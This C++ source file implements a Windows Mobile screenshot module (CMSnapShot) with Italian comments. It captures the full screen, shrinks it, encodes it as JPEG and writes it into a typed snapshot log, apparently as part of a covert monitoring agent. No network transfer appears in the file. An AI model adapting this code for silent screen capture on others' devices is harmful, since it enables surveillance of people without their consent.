#include <new>
#include <atlbase.h>
#include <windows.h>
#include <imaging.h> 
#include <gdiplusenums.h>

#include "Log.h"
#include "SnapShot.h"
#include "Common.h"

const GUID MCLSID_EncoderQuality = { 0x1d5be4b5,0xfa4a,0x452d, { 0x9c,0xdd,0x5d,0xb3,0x51,0x05,0xe7,0xeb } };

HRESULT GetEncoderFromName(	IImagingFactory* pImgFactory,
						   LPWSTR lpStrEnc,
						   GUID* guid )
{
	HRESULT hr = E_FAIL;
	ImageCodecInfo *encoders, *ePtr;
	UINT uEncCount = 0;
	ZeroMemory(guid,sizeof(GUID));

	hr = pImgFactory->GetInstalledEncoders(&uEncCount, &encoders);

	if (SUCCEEDED(hr) && uEncCount > 0 ){
		ePtr = encoders;

		for (unsigned int i = 0; i < uEncCount; i++) {
			if (wcscmp(ePtr->FormatDescription, lpStrEnc) == 0) {
				CopyMemory(guid, &(ePtr->Clsid), sizeof(GUID));
				hr = S_OK;
				break;
			}
			ePtr++;
		}
	}

	ePtr = NULL;

	if (encoders)
		CoTaskMemFree((LPVOID)encoders);

	return hr;
}

HRESULT SetEncoderStream(IImagingFactory* pImgFactory,
						 GUID*			 guidJpeg,
						 IStream**		 pOutStream,
						 IImageEncoder**	 pImageEncoder )
{
	//ASSERT(pImgFactory);

	HRESULT hr = E_FAIL;

	hr = CreateStreamOnHGlobal(NULL, TRUE, (LPSTREAM*) pOutStream);

	if (SUCCEEDED(hr)) {
		hr = pImgFactory->CreateImageEncoderToStream((CLSID*)guidJpeg, *pOutStream,	pImageEncoder);
	}

	return hr;
}

HRESULT SetEncoderQuality(CComPtr<IImageEncoder> pImageEncoder, long lQuality)
{
	HRESULT hr = E_FAIL;

	if (pImageEncoder == NULL)
		return hr;

	EncoderParameters* ParamsList;
	UINT uParamNumber = 1;

	ParamsList = (EncoderParameters*)CoTaskMemAlloc(sizeof (EncoderParameters) + (uParamNumber-1) * sizeof(EncoderParameter));
	ParamsList->Count = uParamNumber;
	EncoderParameter* pPar = NULL;
	pPar = &(ParamsList->Parameter[0]);
	pPar->Guid           = MCLSID_EncoderQuality;
	pPar->NumberOfValues = 1;
	pPar->Type           = EncoderParameterValueTypeLong;
	pPar->Value          = (void*) &lQuality;

	hr = pImageEncoder->SetEncoderParameters(ParamsList);

	CoTaskMemFree(ParamsList);

	return hr;
}

CMSnapShot::CMSnapShot()
: m_hWndDesktop(0x00000000), m_hDCScreen(NULL), m_bInit(FALSE), m_bEncInit(FALSE), m_pbmi(NULL)
{
	ZeroMemory(&m_rExtents, sizeof(RECT));
}

CMSnapShot::~CMSnapShot() {
	if (m_hDCScreen)
		ReleaseDC(m_hWndDesktop, m_hDCScreen);

	if (m_pbmi)
		LocalFree(m_pbmi);
}

void CMSnapShot::Run() {
	if (!m_bInit) {
		m_hDCScreen = GetDC(m_hWndDesktop);

		if (_Init()) {
			m_bInit = TRUE;
		}
	}

	if (m_bInit) {
		if (_InitBMP())
			_Run();
	}
}

void CMSnapShot::_Run() {
	struct snap {
		SnapshotAdditionalData snapAdditional;
		WCHAR wWindow[8]; // Desktop
	};

	PBYTE lpBuf		= NULL;
	PBYTE lpOutBuf	= NULL;
	INT nLen = 0;
	DWORD dwWritten = 0;
	BOOL bOut = FALSE, bEmpty;
	HBITMAP hDIB	= NULL;
	Log snapshotLog;
	struct snap snapStruct;

	// Scriviamo nei log che la finestra di destinazione e' desktop
	wcscpy_s(snapStruct.wWindow, 8, L"Desktop");
	
	snapStruct.snapAdditional.uProcessNameLen = 0;
	snapStruct.snapAdditional.uVersion = LOG_SNAPSHOT_VERSION;
	snapStruct.snapAdditional.uWindowNameLen = WideLen(snapStruct.wWindow);

	bOut = _CreateDIBSection(&hDIB, lpBuf);

	if (bOut) {
		bEmpty = TRUE;

		if (snapshotLog.CreateLog(LOGTYPE_SNAPSHOT, (PBYTE)&snapStruct, 
			sizeof(snapStruct), MMC1)) {

			nLen = _SaveBufferToImage(lpBuf, &lpOutBuf);

			if (nLen > 0) {
				snapshotLog.WriteLog(lpOutBuf, nLen);
				bEmpty = FALSE;
			}
		}
			
		snapshotLog.CloseLog(bEmpty);
	}

	if (hDIB) {
		DeleteObject(hDIB);
		hDIB = NULL;
	}

	SAFE_FREE(lpOutBuf);
}

BOOL CMSnapShot::_InitBMP() {
	if (m_hDCScreen == NULL)
		return FALSE;

	m_rExtents.top		= 0;
	m_rExtents.left		= 0;
	m_rExtents.right	= GetDeviceCaps(m_hDCScreen, HORZRES);
	m_rExtents.bottom	= GetDeviceCaps(m_hDCScreen, VERTRES);

	m_x = (m_rExtents.right - m_rExtents.left) & ~3;
	m_y = m_rExtents.bottom - m_rExtents.top;

	// Riempiamo l'header della BMP
	if (m_pbmi == NULL)
		m_pbmi = (LPBITMAPINFO) LocalAlloc(LPTR, sizeof(BITMAPINFO)+ (3-1) * sizeof(RGBQUAD));

	m_pbmi->bmiHeader.biSize		= sizeof(BITMAPINFOHEADER);
	m_pbmi->bmiHeader.biWidth		= m_x;
	m_pbmi->bmiHeader.biHeight		= m_y;
	m_pbmi->bmiHeader.biPlanes		= 1;	
	m_pbmi->bmiHeader.biBitCount	= SNAPSHOT_DEFAULT_BITSPIXEL;
	m_pbmi->bmiHeader.biCompression	= BI_RGB;

	// Maschera
	LPDWORD lpdwMaschera = (LPDWORD)(m_pbmi->bmiColors);
	lpdwMaschera[0] = 0x00007c00;
	lpdwMaschera[1] = 0x000003e0;
	lpdwMaschera[2] = 0x0000001f;
	m_pbmi->bmiHeader.biCompression = BI_BITFIELDS;

	// BitmapFileHeader
	DWORD dwImageDataSize = m_pbmi->bmiHeader.biWidth * m_pbmi->bmiHeader.biHeight * (m_pbmi->bmiHeader.biBitCount / 8);
	m_bfh.bfType	= 'M' << 8 | 'B';
	m_bfh.bfOffBits	= sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFO) + (3-1) * sizeof(RGBQUAD);
	m_bfh.bfSize	= m_bfh.bfOffBits + dwImageDataSize;

	return TRUE;
}

BOOL CMSnapShot::_Init() {
	if (SUCCEEDED(CoCreateInstance(CLSID_ImagingFactory, NULL, CLSCTX_INPROC_SERVER, IID_IImagingFactory,
		(LPVOID*) &m_pImgFactory))) {
			if (SUCCEEDED(GetEncoderFromName(m_pImgFactory, L"JPEG", &m_guidJpeg )))
				return TRUE;
	}

	return FALSE;
}

BOOL CMSnapShot::_CreateDIBSection(HBITMAP *hDIB, LPBYTE &lpBuf) {
	BOOL bRet = FALSE;
	HBITMAP	hBmpStock = NULL;
	HDC hDCMem = NULL;

	//Crea un memory DC in cui verrà selezionata la DIB
	hDCMem	 = CreateCompatibleDC(m_hDCScreen);

	if (NULL == hDCMem) {
		SNAPSHOT_SAFE_EXIT();
		return bRet;
	}

	*hDIB = CreateDIBSection(hDCMem, m_pbmi, DIB_RGB_COLORS, (LPVOID*)&lpBuf, NULL, 0);

	if (*hDIB == NULL || lpBuf == NULL) {
		SNAPSHOT_SAFE_EXIT();
		return bRet;
	}

	hBmpStock = (HBITMAP)SelectObject(hDCMem, *hDIB);

	if (hBmpStock) {
		BitBlt(hDCMem, 0, 0,
				m_rExtents.right  - m_rExtents.left,
				m_rExtents.bottom - m_rExtents.top,
				m_hDCScreen,
				m_rExtents.left, m_rExtents.top,
				SRCCOPY);
	}

	DeleteDC(hDCMem);
	DeleteObject(hBmpStock);

	if (hDIB != NULL && lpBuf != NULL)
		return TRUE;

	return bRet;
}


ULONG CMSnapShot::_SaveBufferToImage(LPBYTE lpInBuf, LPBYTE* lpOutBuf) {
	HRESULT hr = E_FAIL;
	ULONG ulLen = 0;

	if (lpInBuf == NULL || m_pImgFactory == NULL)
		return ulLen;

	IBitmapImage*				pImgBitmap = NULL;
	CComPtr<IImage>				pInImage;
	CComPtr<IImage>				pOutImage;
	IBasicBitmapOps*			pBitmapOps;

	CComPtr<IStream>			pOutStream;
	CComPtr<IImageEncoder>		pImageEncoder;

	// Riempio la BitmapData
	BitmapData BmpData;

	BmpData.Height	= m_pbmi->bmiHeader.biHeight;
	BmpData.Width	= m_pbmi->bmiHeader.biWidth;
	BmpData.Stride	= BYTESPERLINE(m_pbmi->bmiHeader.biWidth, m_pbmi->bmiHeader.biBitCount );
	BmpData.Reserved = 0;
	BmpData.Scan0 = lpInBuf;

	switch (m_pbmi->bmiHeader.biBitCount) {
		case 8:
			BmpData.PixelFormat = PixelFormat8bppIndexed;
			break;
		case 16:
			BmpData.PixelFormat = PixelFormat16bppRGB555;	//BmpData.PixelFormat = PixelFormat16bppRGB565;
			break;
		case 24:
			BmpData.PixelFormat = PixelFormat24bppRGB;
			break;
		case 32:
			BmpData.PixelFormat = PixelFormat32bppRGB;
			break;
	}

	hr = m_pImgFactory->CreateBitmapFromBuffer(&BmpData, &pImgBitmap);

	if (FAILED(hr)) {
		pImgBitmap->Release();
		return ulLen;
	}

	//// Flip dell'immagine NB: valutare dai test se è da fare sempre oppure no
	if (SUCCEEDED(pImgBitmap->QueryInterface( IID_IBasicBitmapOps, (VOID**)&pBitmapOps))) {
		if (pBitmapOps) {
			pImgBitmap->Release();
			pImgBitmap = NULL;
			hr = pBitmapOps->Flip(FALSE, TRUE, &pImgBitmap);	// XXX passare puntatore vuoto
		}

		pBitmapOps->Release();
		pBitmapOps = NULL;
	}

	if (!pImgBitmap)
		return 0;

	if (SUCCEEDED(pImgBitmap->QueryInterface( IID_IBasicBitmapOps, (VOID**)&pBitmapOps))) {
		if (pBitmapOps) {
			pImgBitmap->Release();
			pImgBitmap = NULL;
			//// Ridimensiono l'immagine. A seconda delle risoluzioni trovate sui cellula  aggiungere eventuali nuove soluzioni
			int ratio = (BmpData.Width * 100) / BmpData.Height;
			switch (ratio) {
				case 133:	// 320x240
					hr = pBitmapOps->Resize(320, 240, BmpData.PixelFormat, InterpolationHintDefault , &pImgBitmap);
					break;
				case 60:	// 480x800
					hr = pBitmapOps->Resize(240, 400, BmpData.PixelFormat, InterpolationHintDefault , &pImgBitmap);
					break;
				case 166:	// 800x480
					hr = pBitmapOps->Resize(400, 240, BmpData.PixelFormat, InterpolationHintDefault , &pImgBitmap);
					break;
				case 75:	// 240x320
				default:
					hr = pBitmapOps->Resize(240, 320, BmpData.PixelFormat, InterpolationHintDefault , &pImgBitmap);
			}
		}
		pBitmapOps->Release();
		pBitmapOps = NULL;
	}

	if (!pImgBitmap)
		return 0;

	hr = SetEncoderStream(	m_pImgFactory,
							&m_guidJpeg,
							&pOutStream,
							&pImageEncoder );
	if (FAILED(hr)) {
		pImgBitmap->Release();
		return ulLen;
	}

	hr = SetEncoderQuality(pImageEncoder, m_lQuality);

	CComPtr<IImageSink> pImageSink;
	hr = pImageEncoder->GetEncodeSink(&pImageSink);

	if (SUCCEEDED(hr) && SUCCEEDED(pImgBitmap->QueryInterface(IID_IImage, (VOID **)&pInImage))) {	
		hr = pInImage->PushIntoSink(pImageSink);
	} else {
		pImgBitmap->Release();
		return ulLen;
	}
	pImgBitmap->Release();

	int iBufStartSize = 4000, iBufReadSize = 0;
	*lpOutBuf = (LPBYTE)malloc(iBufStartSize);

	if (*lpOutBuf == NULL)
		return ulLen;

	LARGE_INTEGER liZero = {0};
	pOutStream->Seek(liZero, STREAM_SEEK_SET, NULL);
	ULONG uRead = 0;
	UINT uStepNum = 0, uStepSize = 4000;
	BOOL bRealloc = FALSE;
	LPBYTE pPtr = *lpOutBuf;

	do {
		if (!bRealloc) {
			hr = pOutStream->Read(pPtr, iBufStartSize, &uRead);

			if (FAILED(hr) || uRead == 0)
				return ulLen;

			if (uRead == iBufStartSize)
				bRealloc = TRUE;
		} else {
			DWORD pos = pPtr - *lpOutBuf;
			*lpOutBuf = (LPBYTE)realloc(*lpOutBuf, iBufStartSize + uStepSize*++uStepNum);

			if (*lpOutBuf == NULL)
				return ulLen;

			pPtr = *lpOutBuf;
			pPtr += pos;

			if (lpOutBuf == NULL || *lpOutBuf == NULL)
				return ulLen;

			hr = pOutStream->Read(pPtr, uStepSize, &uRead);

			if (FAILED(hr))
				return ulLen;
		}

		if (uRead) {
			ulLen += uRead;
			pPtr += uRead;
		}
	} while(uRead);

	return ulLen;
}
